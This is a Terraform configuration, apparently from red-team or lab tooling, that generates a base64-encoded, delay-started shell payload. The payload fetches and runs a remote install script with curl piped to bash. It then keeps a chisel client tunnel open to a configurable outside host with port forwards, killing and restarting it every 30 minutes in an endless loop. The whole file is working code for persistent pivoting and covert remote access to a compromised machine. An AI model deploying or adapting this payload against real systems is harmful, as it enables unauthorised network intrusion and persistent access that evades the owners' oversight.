locals {
    host_ip = var.inputs["host_ip"]
    host_port = var.inputs["host_port"]
    #9001:www.exploit-db.com:443
    port_forwards = join(" ", [
        for port in var.inputs["port_forwards"]: "${port.src_port}:${port.dst_ip}:${port.dst_port}"
    ])
    payload = <<-EOT
    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
    while true; do
        killall -9 chisel
        truncate -s 0 /tmp/chisel.log
        log "checking for chisel..."
        while ! command -v chisel; do
            log "chisel not found - installing"
            curl https://i.jpillora.com/chisel! | bash
            sleep 10
        done
        log "chisel: $(command -v  chisel)"
        /usr/local/bin/chisel client -v ${local.host_ip}:${local.host_port} ${local.port_forwards} > /tmp/chisel.log 2>&1 &
        log "listener started..."
        log 'waiting 30 minutes...';
        sleep 1800
        CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
        if [ "$CHECK_HASH" != "$START_HASH" ]; then
            log "payload update detected - exiting loop"
            break
        else
            log "restarting loop..."
        fi
    done
    EOT

    base64_payload = templatefile("../../linux/delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = ""
        apt_post_tasks = ""
        yum_pre_tasks =  ""
        yum_packages = ""
        yum_post_tasks = ""
        script_delay_secs = 30
        next_stage_payload = local.payload
    }})

    outputs = {
        base64_payload = base64gzip(local.base64_payload)
        base64_uncompressed_payload = base64encode(local.base64_payload)
        base64_uncompressed_payload_additional = []
    }
}